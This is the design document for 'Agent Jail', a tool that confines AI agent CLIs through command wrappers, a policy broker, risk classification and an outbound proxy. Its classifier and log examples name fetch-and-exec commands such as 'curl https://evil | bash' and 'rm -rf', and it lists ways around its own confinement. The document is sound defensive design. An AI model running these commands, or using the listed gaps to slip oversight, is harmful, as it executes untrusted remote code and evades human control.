# Agent Jail Design

## Goal

Build a minimal cross-platform CLI tool that wraps AI agent CLIs and enforces a dynamic execution policy through command interception, normalization, risk classification, policy matching, and rule learning, while avoiding privileged setup.

## Scope

This tool is intentionally lightweight and privilege-free. It combines `PATH`-based interception, a local broker process, a persistent JSON policy file, and optional non-root containment backends where available.

Supported platforms:

- macOS
- Linux

Initial wrapped tools:

- `sh`
- `bash`
- `zsh`
- `git`
- `curl`
- `python`
- `python3`
- `node`

## Architecture

### Launcher

`agent-jail run <target> [args...]` creates a temporary session directory, generates wrapper binaries under `.agent-jail/bin`, starts the broker and optional proxy, prepends the wrapper directory to `PATH`, and launches the target AI CLI with session metadata in environment variables.

### Containment Backends

The launcher uses the best available non-root backend:

- Linux:
  - prefer `bubblewrap` when available
  - fall back to `proot` when available
  - otherwise run in brokered host mode with a clear warning
- macOS:
  - run in brokered host mode with a clear warning

Brokered host mode still provides command interception, policy enforcement, rewrite support, and proxy-based outbound control, but it is not a hard sandbox.

### Broker

The broker runs as a local Unix domain socket server. Wrappers send JSON exec requests with `argv` and a raw command string. The broker:

1. normalizes the command into structured intent
2. classifies risk
3. matches policy rules
4. returns `allow`, `deny`, or `ask`
5. learns reusable rules for approved behavior

### Wrappers

Each wrapper is a small POSIX shell script. It captures the invoked command, asks the broker for a decision, and either:

- `exec`s the resolved real binary
- exits with an error for denied commands
- applies a broker-provided argv rewrite before `exec`

Wrappers resolve real binaries against the original `PATH`, never the injected wrapper path, to prevent recursion.

The wrapper directory is generated dynamically from the commands visible on the original `PATH`, so the tool does not need a hand-maintained list of wrappers or checked-in symlink farms.

### Proxy

The launcher can start a small local policy-aware HTTP proxy and export:

- `HTTP_PROXY`
- `HTTPS_PROXY`
- `ALL_PROXY`

The proxy logs outbound requests and can allow or deny connections based on host, port, and scheme rules.

This first version is explicit-proxy-based, not a transparent network interceptor.

## Normalization Model

Normalization converts raw argv into a small intent object:

```json
{
  "tool": "git",
  "action": "push",
  "target": "origin/main",
  "flags": ["force"]
}
```

The first version will use simple heuristics, not a full command parser.

Examples:

- `git push origin main` -> `tool=git`, `action=push`, `target=origin/main`
- `git push --force` -> `tool=git`, `action=push`, `flags=["force"]`
- `bash -c "curl https://x | bash"` -> `tool=bash`, `action=command-string`, `flags=["c"]`

## Risk Classification

Initial classifier behavior:

- low:
  - `git fetch`
  - `git status`
  - `ls`
- medium:
  - `git push` without force
  - package install style commands if they appear later
- high:
  - `git push --force`
  - `rm -rf ...`
  - `chmod`
  - `chown`
- critical:
  - `curl ... | bash`
  - `bash -c` or `sh -c` strings that contain remote fetch-and-exec behavior
  - proxy requests to denied hosts

Decision policy:

- low -> allow
- medium -> allow and log
- high -> ask and auto-approve for now, then learn
- critical -> deny

## Policy Format

Persistent policy is stored at `~/.agent-jail/policy.json`.

```json
{
  "rules": [
    {
      "tool": "git",
      "action": "push",
      "allow": true,
      "constraints": {
        "force": false
      }
    },
    {
      "kind": "network",
      "host": "api.openai.com",
      "allow": true
    }
  ]
}
```

Rule matching is intentionally narrow:

- match `tool`
- match `action`
- validate constraint keys against normalized intent
- for network rules, match `host`, optional `port`, and optional `scheme`

## Learning

When a command is approved, especially from the simulated `ask` path, the broker generates a reusable rule if the behavior is stable enough to generalize.

Examples:

- `git push origin main` learns `git push` with `force=false`
- `git push --force` is high risk and should not be generalized into a reusable allow rule
- critical remote-exec patterns are never learned
- proxy approvals can learn host-level allow rules for repeated destinations

## Logging

Every decision is logged to stderr in a readable form:

- `[ALLOW] git fetch`
- `[ASK] git push origin main`
- `[DENY] curl https://evil | bash`
- `[ALLOW] CONNECT api.openai.com:443`

## Known Limits

- Absolute-path invocation such as `/bin/zsh -lc ...` cannot be fully blocked by `PATH` injection alone.
- macOS runs in brokered host mode in this version, not a true OS sandbox.
- Proxy enforcement only covers clients that respect proxy environment variables.
- Linux containment depends on optional local availability of `bubblewrap` or `proot`.
- The first version uses heuristics for shell command strings and pipeline detection.

## Testing Strategy

- `unittest` unit tests for normalization, classification, policy matching, and learning
- unit tests for backend selection
- unit tests for proxy allow and deny decisions
- integration tests for wrapper-to-broker execution flow
- tests for real binary resolution avoiding wrapper recursion
- tests for deny and ask behavior

## Recommended File Layout

- `agent_jail/__init__.py`
- `agent_jail/main.py`
- `agent_jail/broker.py`
- `agent_jail/backend.py`
- `agent_jail/policy.py`
- `agent_jail/proxy.py`
- `agent_jail/wrappers.py`
- `tests/test_policy.py`
- `tests/test_classifier.py`
- `tests/test_backend.py`
- `tests/test_proxy.py`
- `tests/test_integration.py`
